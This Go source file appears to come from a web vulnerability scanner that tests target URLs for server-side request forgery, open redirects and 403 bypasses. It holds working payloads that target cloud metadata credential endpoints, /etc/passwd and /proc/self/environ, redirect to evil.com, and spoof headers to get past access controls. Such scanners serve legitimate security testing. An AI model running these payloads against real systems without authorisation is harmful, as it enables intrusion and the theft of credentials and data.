package native

import (
	"fmt"
	"net/http"
	"net/url"
	"time"
)

type AttackResult struct {
	Type       string `json:"type"`
	Endpoint   string `json:"endpoint"`
	Payload    string `json:"payload"`
	Success    bool   `json:"success"`
	StatusCode int    `json:"status_code"`
	Evidence   string `json:"evidence"`
}

// ssrfSignatures are content fragments that only appear when a server-side
// request actually reached an internal service.  A plain HTTP 200 is not a
// finding: most internet-facing pages return 200.
var ssrfSignatures = []string{
	"root:x:0:0:",
	"ami-id",
	"instance-id",
	"iam/security-credentials",
	"computemetadata",
	"ssh-2.0-",
	"redis_version",
	"-err unknown command",
	"mysql_native_password",
	"127.0.0.1:",
	"metadata.google.internal",
}

func TestSSRF(baseURL string, params map[string]string) []AttackResult {
	payloads := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/user-data/",
		"http://127.0.0.1:22",
		"http://127.0.0.1:3306",
		"http://127.0.0.1:6379",
		"http://localhost:8080/_config",
		"http://[::1]:22",
		"http://0.0.0.0:22",
		"file:///etc/passwd",
		"file:///proc/self/environ",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://100.100.100.200/latest/meta-data/",
	}

	client := scanClient(12 * time.Second)
	results := make([]AttackResult, 0)
	seen := make(map[string]bool)

	for param, original := range params {
		_, baselineBody, _, err := paramRequest(client, baseURL, params, param, original)
		if err != nil {
			continue
		}

		for _, payload := range payloads {
			status, body, err := newParamRequest(client, baseURL, params, param, payload)
			if err != nil {
				continue
			}
			signature := newSignature(body, baselineBody, ssrfSignatures)
			if signature == "" {
				continue
			}
			key := param + "\x00" + signature
			if seen[key] {
				continue
			}
			seen[key] = true
			results = append(results, AttackResult{
				Type:       "SSRF",
				Endpoint:   baseURL,
				Payload:    payload,
				Success:    true,
				StatusCode: status,
				Evidence: fmt.Sprintf(
					"Internal service content %q leaked through parameter %s", signature, param),
			})
		}
	}

	return results
}

func TestOpenRedirect(baseURL string, params map[string]string) []AttackResult {
	payloads := []string{
		"//evil.com",
		"https://evil.com",
		"http://evil.com",
		"//evil.com@good.com",
		"https://evil.com%2F@good.com",
		"//evil.com%2F..",
		"/\\evil.com",
		"https://evil.com?",
		"https://evil.com#",
		"///evil.com",
	}

	client := scanClient(12 * time.Second)
	results := make([]AttackResult, 0)
	seen := make(map[string]bool)

	for param, original := range params {
		_, baselineHeader, _, err := paramResponse(client, baseURL, params, param, original)
		if err != nil {
			continue
		}
		baselineLocation := baselineHeader.Get("Location")

		for _, payload := range payloads {
			status, header, _, err := paramResponse(client, baseURL, params, param, payload)
			if err != nil || status < 300 || status >= 400 {
				continue
			}
			location := header.Get("Location")
			if location == "" || location == baselineLocation {
				continue
			}
			resolved := location
			if base, parseErr := url.Parse(baseURL); parseErr == nil {
				if ref, refErr := url.Parse(location); refErr == nil {
					resolved = base.ResolveReference(ref).String()
				}
			}
			if !isExternalAttackerHost(resolved) && !isExternalAttackerHost(decodedURL(location)) {
				continue
			}
			key := param + "\x00" + location
			if seen[key] {
				continue
			}
			seen[key] = true
			results = append(results, AttackResult{
				Type:       "Open Redirect",
				Endpoint:   baseURL,
				Payload:    payload,
				Success:    true,
				StatusCode: status,
				Evidence:   fmt.Sprintf("Redirects parameter %s to attacker host: %s", param, location),
			})
		}
	}

	return results
}

// decodedURL expands common single/double URL-encoded redirects.
func decodedURL(raw string) string {
	value := raw
	for attempt := 0; attempt < 2; attempt++ {
		decoded, err := url.QueryUnescape(value)
		if err != nil || decoded == value {
			break
		}
		value = decoded
	}
	return value
}

type bypassVariant struct {
	path    string
	headers map[string]string
}

func TestBypass403(targetURL string) []AttackResult {
	client := scanClient(12 * time.Second)

	baselineRequest, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil
	}
	baselineResp, err := client.Do(baselineRequest)
	if err != nil {
		return nil
	}
	baselineBody := readLimited(baselineResp.Body)
	baselineResp.Body.Close()
	if baselineResp.StatusCode != http.StatusForbidden && baselineResp.StatusCode != http.StatusUnauthorized {
		return []AttackResult{{
			Type:       "403 Bypass",
			Endpoint:   targetURL,
			Success:    false,
			StatusCode: baselineResp.StatusCode,
			Evidence: fmt.Sprintf(
				"Not applicable: target returns HTTP %d, not 401/403", baselineResp.StatusCode),
		}}
	}

	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}
	path := parsed.EscapedPath()
	if path == "" {
		path = "/"
	}

	// A random missing path establishes what a soft-404 response looks like.
	// It must not share the protected prefix, otherwise the server returns the
	// same 403 body and the comparison becomes meaningless.
	notFoundPath := "/hackit-404-" + fmt.Sprintf("%d", time.Now().UnixNano())
	notFoundURL := parsed.Scheme + "://" + parsed.Host + notFoundPath
	notFoundRequest, _ := http.NewRequest("GET", notFoundURL, nil)
	notFoundBody := []byte{}
	if resp, err := client.Do(notFoundRequest); err == nil {
		notFoundBody = readLimited(resp.Body)
		resp.Body.Close()
	}

	variants := []bypassVariant{
		{path: path + "/"},
		{path: path + "/."},
		{path: path + "//"},
		{path: "/." + path},
		{path: path + "%20"},
		{path: path + "%09"},
		{path: path + "?"},
		{path: path + ";/.css"},
		{path: path + "..;/"},
		{path: "/%2e" + path},
		{path: path + "%2f"},
		{path: path + ".json"},
		{path: path, headers: map[string]string{"X-Forwarded-For": "127.0.0.1"}},
		{path: path, headers: map[string]string{"X-Forwarded-Host": "localhost"}},
		{path: path, headers: map[string]string{"X-Real-IP": "127.0.0.1"}},
		{path: path, headers: map[string]string{"X-Original-URL": path}},
		{path: path, headers: map[string]string{"X-Rewrite-URL": path}},
		{path: path, headers: map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}},
		{path: path, headers: map[string]string{"X-Originating-IP": "127.0.0.1"}},
	}

	results := make([]AttackResult, 0)
	seen := make(map[string]bool)

	for _, variant := range variants {
		variantURL := parsed.Scheme + "://" + parsed.Host + variant.path
		req, err := http.NewRequest("GET", variantURL, nil)
		if err != nil {
			continue
		}
		for key, value := range variant.headers {
			req.Header.Set(key, value)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body := readLimited(resp.Body)
		resp.Body.Close()

		// Only a successful response that is neither the protected page nor a
		// generic soft-404 qualifies as a bypass.
		if resp.StatusCode != http.StatusOK || len(body) == 0 {
			continue
		}
		if len(notFoundBody) > 0 && responseDiffRatio(body, notFoundBody) < 0.02 {
			continue
		}
		if responseDiffRatio(body, baselineBody) < 0.02 {
			continue
		}

		key := variant.path + fmt.Sprintf("%v", variant.headers)
		if seen[key] {
			continue
		}
		seen[key] = true
		results = append(results, AttackResult{
			Type:       "403 Bypass",
			Endpoint:   variantURL,
			Payload:    fmt.Sprintf("Headers: %v", variant.headers),
			Success:    true,
			StatusCode: resp.StatusCode,
			Evidence:   fmt.Sprintf("Protected path became accessible via %s (HTTP 403 -> 200)", variant.path),
		})
	}

	return results
}
